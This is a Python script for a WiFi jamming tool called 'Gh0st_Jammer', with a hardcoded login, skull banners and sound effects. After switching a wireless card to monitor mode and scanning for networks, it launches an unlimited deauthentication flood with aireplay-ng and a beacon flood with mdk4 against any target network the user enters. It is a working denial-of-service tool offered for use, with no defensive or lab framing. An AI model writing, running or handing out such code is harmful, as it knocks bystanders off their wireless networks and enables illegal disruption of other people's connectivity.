#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from getpass import getpass
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich import box

console = Console()

# =====================
# Configuration
# =====================
USERNAME = "kuldeep"
PASSWORD = "hacker123"
AUDIO_FILES = {
    "intro": "intro.mp3",
    "exit": "exit.mp3"
}

# Detect Platform
def detect_platform():
    if "termux" in os.environ.get('PREFIX', '').lower():
        return "termux"
    elif os.path.exists('/etc/blackarch-release'):
        return "blackarch"
    elif os.path.exists('/etc/kali-release'):
        return "kali"
    elif os.path.exists('/etc/lsb-release') and 'ubuntu' in open('/etc/lsb-release').read().lower():
        return "ubuntu"
    else:
        return "unknown"

PLATFORM = detect_platform()

# Set Interface
if PLATFORM == "termux":
    INTERFACE = "wlan0"  # Termux में WiFi इंटरफेस
else:
    INTERFACE = "wlan0"  # डिफ़ॉल्ट

# =====================
# Audio Playback System
# =====================
def play_voice(filename):
    path = os.path.join(os.path.dirname(__file__), AUDIO_FILES[filename])
    if PLATFORM == "termux":
        os.system(f'termux-media-player play "{path}" > /dev/null 2>&1')
    else:
        os.system(f'mpg123 "{path}" > /dev/null 2>&1')

# =====================
# Animation Loader
# =====================
def wait_anim(message="Summoning the ghost...", seconds=4):
    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        TimeElapsedColumn(),
        transient=True,
    ) as progress:
        task = progress.add_task(f"[bold green]{message}", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            progress.advance(task)

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

# =====================
# Login Banner (Standard)
# =====================
def banner_main():
    clear_screen()
    banner = """
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗         ███████╗██╗
██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝         ██╔════╝██║
██║  ███╗███████║██║██╔██║███████╗   ██║            █████╗  ██║
██║   ██║██╔══██║████╔╝██║╚════██║   ██║   ██████   ██╔══╝  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚════╝  ╚═╝     ╚═╝                                                     
            ██╗ █████╗ ███╗   ███╗███████╗██████╗        
            ██║██╔══██╗████╗ ████║██╔════╝██╔══██╗       
            ██║███████║██╔████╔██║█████╗  ██████╔╝       
       ██   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗       
       ╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║       
        ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝                                                  
"""
    panel = Panel.fit(Text(banner, style="bold cyan"),
                      title="🔥 Gh0st_Jammer (WiFi Jammer) 🔥",
                      subtitle=f"Platform: {PLATFORM.upper()} | Created by Kuldeep Chauhan",
                      border_style="bright_red", box=box.HEAVY)
    console.print(panel)
    wait_anim("Loading tool...", 3)

# =====================
# Bhayanak Skull Banner (After Login)
# =====================
def print_scary_banner():
    skull = Text()
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⢉⠭⠀⠴⠘⠩⡢⠏⠘⡵⢒⠬⣍⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")⠀
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⣡⠔⠃⠀⠰⠀⠀⠀⠀⠈⠂⢀⠀⢋⠞⣬⢫⣦⣍⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢫⣼⠿⠁⠀⠀⠀⠐⠀⠀⠰⠀⠢⠈⠀⠠⠀⢚⡥⢏⣿⣿⣷⡵⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢓⣽⡓⡅⠀⠀⠀⠄⠀⠀⠄⠀⠁⠀⠀⠌⢀⠀⡸⣜⣻⣿⣿⣿⣿⣼⡀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⢀⡤⣤⣄⣠⠤⣄⠀⠀⠀⠀⠀⠀⠀⢀⣧⣿⡷⠹⠂⠀⠂⠀⢀⠠⠈⠀⠌⠀⠁⢈⠀⠄⢀⡷⣸⣿⣿⣿⣿⣿⣧⠃⠀⡴⢋⢠⣤⣦⣬⣕⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣔⣵⣿⣻⣯⣍⣉⠚⢕⢆⠀⠀⠀⠀⠀⢸⢾⣽⡷⡂⠀⠀⠄⠂⠀⡀⠄⠂⠀⠌⠀⡀⠀⢀⡾⣯⢿⣿⣿⣿⣿⣿⣿⠰⠸⠠⢠⣾⣿⣿⣷⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣼⣿⣿⠿⠿⢿⣿⣇⡛⡻⣧⠀⠀⠀⠀⢼⢸⡟⡧⣧⠀⠃⠀⡀⠄⠀⢀⠠⠘⠀⠠⠀⠀⡟⢧⣛⣿⣿⣿⣿⣿⣿⣧⠇⠀⡇⢻⣿⣿⣿⠟⠻⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣿⣿⠁⣠⣤⠀⠙⢿⣿⡤⢘⣆⠀⠀⠀⢹⣼⣿⡽⠖⠁⠀⢤⠀⠀⡐⠀⢀⠐⠈⠀⢠⠖⠙⠣⠟⣻⢿⣿⣟⣿⡿⠃⠀⠀⠃⢼⣿⣧⠀⠀⠀⠸⣿⣣⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣿⣿⣆⣿⡟⠀⠀⠀⣿⡇⠰⢸⠀⠀⠀⡸⡻⡕⠉⠀⠀⡐⠀⠈⠁⠀⠀⢠⠀⡴⠀⡠⠀⢀⠤⡲⠟⣉⠻⣿⣟⠁⠀⠀⠀⡅⢺⣿⣿⠃⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠈⠙⠛⠉⠀⠀⠀⣀⡿⣗⠧⣼⠀⠄⡎⣿⣇⣧⣀⠑⢆⠀⠀⠀⢹⢄⢀⢧⠊⢀⠊⠀⠘⡡⣪⡴⠛⢻⣷⣜⣿⣦⠀⠀⡀⡿⣸⣿⣿⡆⠀⠀⡠⢐⠫⠉⠩⠭⣗⣦⡀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⢠⢹⣷⣻⠇⣿⠘⡀⣿⣿⣿⣿⠛⠛⢦⣙⠄⠀⢈⣫⢼⠀⠤⠁⠀⣠⣾⣿⡇⠀⠐⠂⢻⣿⣟⣿⡇⢠⠃⣧⣿⣿⣾⠁⢀⢎⣴⡶⡿⢿⣟⣷⢮⡝⢿⣷⠤⡀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠈⣽⣯⢿⣣⡹⢰⠘⣿⡿⣹⣿⠀⠀⠹⣿⡿⣷⣬⣯⣾⣷⣤⣴⣾⡟⣍⡿⠃⠀⠀⠀⢸⣿⣿⣩⣒⣵⣷⣿⣿⡿⠃⠀⡞⢺⣿⣿⣯⢿⠉⠀⠉⠛⢦⣻⣇⠘⡆\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⣀⣿⣾⡾⣿⣵⡢⠳⢿⣷⢹⣿⣆⠀⠀⠈⠉⢉⣽⢟⣿⠟⢻⢿⣷⣄⡁⠀⠀⠀⠀⣀⣾⡟⣍⣿⣿⣿⣿⣿⣿⡗⠀⠀⠇⣽⣿⣿⣿⡼⠀⠀⣠⡤⣀⠿⠏⣴⠇\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠸⡼⣿⣿⣽⣿⣿⣶⣬⣿⣯⢿⣷⣥⠶⣒⣶⣾⠏⠐⠙⠀⠈⠚⡌⢪⣿⣧⣖⠦⡭⠿⢛⣼⣿⣿⢿⣿⣿⡿⠝⠁⠀⠰⢀⣿⣿⣾⣿⡇⠀⠀⠻⢿⡝⠲⠛⠋⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⡿⠻⢷⣮⣉⣭⣡⣟⡱⠀⠀⡀⢀⡞⢀⢠⡀⠹⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣟⠋⠀⠀⠀⡠⡡⣹⣿⣿⣿⠿⠡⢀⣀⠀⠾⠁⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠽⢿⢿⣻⡿⠈⢀⣶⣿⣿⣿⣿⡽⠃⢀⡴⣰⣿⢤⣓⢿⣿⣄⠙⣻⣷⡟⣿⣿⣿⣽⡻⣿⠿⠧⡶⣒⢭⣺⣽⣿⠟⢍⢀⠀⡉⠑⢶⣯⡲⣄⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⣟⣷⣞⡟⠉⣴⡿⣯⣷⣿⣿⡟⡡⢀⣜⣼⣿⣿⣎⢳⢿⢻⣿⡄⠑⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣾⣿⣿⢃⣠⣤⢖⡾⢷⡲⣆⡳⣿⣮⢢⡄⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣄⢈⢆⠻⢿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡧⢨⣲⣷⣿⠋⣟⣶⣀⣳⡖⣿⣇⣃⠀⠀\n", style="bold yellow")
    skull.append("⠀⣘⡸⣞⣿⣿⣿⣿⣿⣿⣿⡿⠁⣺⣣⣿⣿⣿⣿⠎⢀⢢⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣢⢀⠡⡘⢪⡯⡻⣿⣿⣿⣿⣿⣿⣻⣟⢧⣽⣿⣿⠀⠀⣎⣱⡏⣏⣿⣯⡽⠀⠀\n", style="bold yellow")
    skull.append("⠀⣿⣧⣼⣿⡟⠛⠛⠿⢟⠟⣁⣼⣿⣿⠛⢉⡜⠁⡠⣠⣷⢿⣿⡿⣿⣿⣿⣿⠟⠉⠙⠛⢯⣽⣯⠷⣄⠑⠜⠑⡷⡜⢿⠿⠟⠛⠉⠀⢸⢺⣾⣿⣿⣷⣄⣀⠏⣱⣿⣿⣿⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⢹⣿⣾⣿⣿⣤⡤⠔⢑⣡⣾⡿⡿⠁⡠⠋⠀⡀⢀⣿⡟⣿⣿⣿⡙⣿⣻⣿⡄⠀⠀⠀⠀⠉⠻⣿⣟⣧⡄⠀⠘⣟⢦⡱⣄⠀⠀⠀⢸⣼⣿⢿⣿⣿⣷⣤⣾⣿⣿⣿⠏⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠹⢿⣿⠏⣰⣧⣾⣿⣿⠟⠋⠀⡰⠡⡡⠀⣠⣿⣿⣿⣿⣿⣿⣗⢸⣿⣿⣷⠀⠀⠀⠀⠀⠀⠱⡹⣟⣿⣦⡁⠈⠳⢕⢄⠑⠂⠐⢾⣿⣿⣿⣿⣿⠛⠿⠟⠛⠋⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⣯⣼⣿⣿⠋⠁⠀⠀⠀⠀⡇⠐⠀⢠⣿⣿⡝⣿⠃⠈⢻⡞⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠉⢻⣷⣾⣿⣦⡄⠀⠀⠈⠐⢺⣽⣿⣿⡎⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⣿⣻⡟⠁⠀⠀⠀⠀⠀⢸⡇⠀⢀⣿⣿⣿⣿⠏⠀⠀⢸⠳⣜⣹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⣿⣿⣷⣶⣶⣶⣿⣿⢟⣻⣿⢟⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠸⣿⣿⡦⠀⠀⠀⠀⠀⠘⡇⠰⣼⡿⡿⣾⡏⠀⠀⠀⢸⠣⣹⣾⣿⡹⠀⡠⢄⣂⢤⠀⠀⠀⠀⠀⠈⠉⠻⣟⢿⣾⣚⣿⣿⣿⣿⣽⡏⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⢠⣾⢛⣿⡟⠀⠀⠀⠀⠀⠀⢷⣀⢻⣷⣟⣻⡇⠀⠀⢀⢯⣅⣿⣷⣿⠇⣜⣾⣿⣿⣿⣧⣀⠀⠀⠀⠀⠀⠀⠈⠉⠸⠿⣿⠏⠘⠔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠈⢻⡯⢿⣿⡿⡴⣀⡠⣪⡷⣽⣿⣿⡿⢚⣿⣿⡟⠀⠙⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⡈⠛⠿⠽⢞⢋⠜⠻⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠛⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("\n[☠️  GHOST JAMMER READY  ☠️]\n", style="bold white on red")
    console.print(skull)
    time.sleep(5)

# =====================
# Exit Panel
# =====================
def banner_exit():
    panel = Panel.fit(Text("💀 THANK YOU FOR USING GHOST JAMMER 💀", justify="center", style="bold white on red"),
                      title="Exiting...", border_style="bright_magenta")
    console.print(panel)

# =====================
# Login System
# =====================
def login():
    banner_main()
    console.print(Panel("🔐 [bold red]Login Required[/bold red]", style="bold green", border_style="cyan"))
    username = console.input("[bold yellow]> Username:[/bold yellow] ")
    password = getpass("🔐 Password: ")

    if username == USERNAME and password == PASSWORD:
        play_voice("intro")
        return True
    else:
        console.print("[bold red]❌ Invalid credentials![/bold red]")
        return False

# =====================
# Network Setup (Platform-Specific)
# =====================
def enable_monitor_mode():
    if PLATFORM == "termux":
        console.print("[bold yellow]⚠️ Termux requires manual steps for Monitor Mode![/bold yellow]")
        console.print("[bold cyan]1. Run 'termux-wifi-enable'[/bold cyan]")
        console.print("[bold cyan]2. Use 'iwconfig' to check interface.[/bold cyan]")
    else:
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo iwconfig {INTERFACE} mode monitor")
        os.system(f"sudo ifconfig {INTERFACE} up")
        console.print(f"[+] {INTERFACE} is now in monitor mode")

def scan_networks():
    console.print("[*] Scanning for Wi-Fi networks... (CTRL+C to stop)")
    time.sleep(2)
    if PLATFORM == "termux":
        os.system(f"iwlist {INTERFACE} scan")
    else:
        os.system(f"sudo airodump-ng {INTERFACE}")

def restore_interface():
    console.print("[*] Restoring interface...")
    if PLATFORM != "termux":
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo iwconfig {INTERFACE} mode managed")
        os.system(f"sudo ifconfig {INTERFACE} up")
        console.print(f"[+] {INTERFACE} is back to managed mode.")

# =====================
# Jamming (Deauth + Beacon)
# =====================
def start_jamming(bssid, channel):
    console.print(f"[+] Target BSSID: {bssid} on Channel: {channel}")
    console.print("[*] Setting channel...")
    if PLATFORM != "termux":
        os.system(f"sudo iwconfig {INTERFACE} channel {channel}")
    
    console.print("[*] Starting Deauth + Beacon Flood attack... (Press CTRL+C to stop)")
    time.sleep(1)

    try:
        if PLATFORM == "termux":
            console.print("[bold red]❌ Termux does not support Deauth attacks![/bold red]")
        else:
            deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, INTERFACE])
            mdk4_proc = subprocess.Popen(["sudo", "mdk4", INTERFACE, "b", "-c", channel, "-t", bssid])
            deauth_proc.wait()
            mdk4_proc.wait()

    except KeyboardInterrupt:
        console.print("\n[!] CTRL+C pressed. Stopping attacks...")
        if PLATFORM != "termux":
            deauth_proc.terminate()
            mdk4_proc.terminate()
        restore_interface()
        banner_exit()
        play_voice("exit")

# =====================
# Main Function
# =====================
def main():
    if login():
        clear_screen()
        print_scary_banner()
        enable_monitor_mode()
        scan_networks()

        bssid = console.input("\n[+] Enter Target BSSID (MAC Address): ")
        channel = console.input("[+] Enter Target Channel: ")
        start_jamming(bssid, channel)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        restore_interface()
        banner_exit()
        play_voice("exit")